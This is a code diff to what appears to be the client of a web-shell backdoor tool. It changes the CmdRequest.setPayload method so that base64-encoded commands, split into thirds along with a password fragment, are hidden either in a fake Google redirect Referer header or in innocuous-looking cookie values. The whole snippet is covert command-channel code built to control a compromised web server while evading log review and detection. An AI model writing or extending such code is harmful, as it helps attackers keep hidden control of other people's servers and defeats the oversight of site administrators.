@@ -33,19 +33,27 @@ class CmdRequest(Request):
 		else:
 			self.query = ''.join( self.parsed.path.split('.')[:-1] ).replace( '/', ' ' )
 
-	def setPayload( self, payload ):
+	def setPayload( self, payload, mode):
 		payload = base64.b64encode( payload.strip() )
 		length  = len(payload)
 		third	= length / 3
 		thirds  = third * 2
-		referer = "http://www.google.com/url?sa=%s&source=web&ct=7&url=%s&rct=j&q=%s&ei=%s&usg=%s&sig2=%s" % ( self.password[:2], \
-                                                                                                               urllib2.quote( self.url ), \
-                                                                                                               self.query.strip(), \
-                                                                                                               payload[:third], \
-                                                                                                               payload[third:thirds], \
-                                                                                                               payload[thirds:] )
-		self['Referer']	= referer
-
+		
+		if mode == 'Referer':
+			referer = "http://www.google.com/url?sa=%s&source=web&ct=7&url=%s&rct=j&q=%s&ei=%s&usg=%s&sig2=%s" % ( self.password[:2], \
+	                                                                                                               urllib2.quote( self.url ), \
+	                                                                                                               self.query.strip(), \
+	                                                                                                              payload[:third], \
+	                                                                                                               payload[third:thirds], \
+	                                                                                                               payload[thirds:] )
+			self['Referer']	= referer
+		
+		else: # mode == 'Cookie' or unset
+		
+			cookies = "USR=%s; ASD1=%s; ASD3=%s; ASD4=%s" % (self.password[:2], payload[:third], payload[third:thirds], payload[thirds:])
+			self['Cookie'] = cookies
+		
+		
 	def setPostData(self, data_dict):
 		self.data = data_dict
 
